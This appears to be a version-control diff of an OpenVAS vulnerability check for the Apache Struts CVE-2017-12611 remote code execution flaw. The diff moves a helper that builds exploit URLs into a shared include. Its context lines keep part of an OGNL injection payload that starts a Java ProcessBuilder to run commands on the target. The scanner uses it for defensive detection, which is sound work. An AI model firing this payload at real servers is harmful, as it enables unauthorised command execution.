@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_apache_struts_CVE_2017_12611.nasl 7231 2017-09-22 08:12:21Z cfischer $
+# $Id: gb_apache_struts_CVE_2017_12611.nasl 7256 2017-09-26 05:24:20Z asteins $
 #
 # Apache Struts 'CVE-2017-12611' Remote Code Execution Vulnerability
 #
@@ -28,10 +28,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.108243");
-  script_version("$Revision: 7231 $");
+  script_version("$Revision: 7256 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-22 10:12:21 +0200 (Fri, 22 Sep 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2017-09-26 07:24:20 +0200 (Tue, 26 Sep 2017) $");
   script_tag(name:"creation_date", value:"2017-09-11 12:00:00 +0200 (Mon, 11 Sep 2017)");
   script_cve_id("CVE-2017-12611");
   script_name("Apache Struts 'CVE-2017-12611' Remote Code Execution Vulnerability");
@@ -70,51 +70,6 @@ include("misc_func.inc");
 include("host_details.inc");
 include("url_func.inc");
 
-# <-- START TODO: Move to own include, this is partly adapted from sql_injection.nasl and might be useful for other NVTs as well...
-function _create_exploit_req( cgiArray, ex ) {
-
-  local_var cgiArray, ex, pseudocount, rrayval, tmpf, data, param, z, url, i, urls;
-
-  urls = make_array();
-
-  pseudocount = 0;
-  foreach rrayval( cgiArray ) {
-    if( pseudocount >= 2 ) {
-      if( "]" >< rrayval ) {
-        pseudocount--;
-        tmpf = ereg_replace( pattern:"\[|\]", string:rrayval, replace:"" );
-        data[pseudocount] = tmpf;
-      } else {
-        param[pseudocount] = rrayval;
-      }
-    } else {
-      param[pseudocount] = rrayval;
-    }
-    pseudocount++;
-  }
-
-  for( z = 2; z < max_index( param ); z++ ) {
-    url = string( param[0], "?" );
-    for( i = 2; i < max_index( param ); i++ ) {
-      if( z == i ) {
-        url += param[i] + "=" + ex;
-      } else {
-        if( data[i] ) {
-          url += param[i] + "=" + data[i];
-        } else {
-          url += param[i] + "=";
-        }
-      }
-      if( param[i + 1] ) {
-        url += "&";
-      }
-    }
-    urls = make_list( urls, url + "&" );
-  }
-  return urls;
-}
-# END TODO -->
-
 port = get_http_port( default:80 );
 
 cgis = get_kb_list( "www/" + port + "/cgis" );
@@ -136,7 +91,7 @@ foreach cgi( cgis ) {
          "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c + "))." +
          "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";
 
-    urls = _create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
+    urls = create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
     foreach url( urls ) {
 
       req = http_get_req( port:port, url:url );
@@ -177,7 +132,7 @@ foreach cgi( cgis ) {
 
   cgiArray = split( cgi, sep:" ", keep:FALSE );
 
-  urls = _create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
+  urls = create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
   foreach url( urls ) {
 
     req = http_get_req( port:port, url:url );
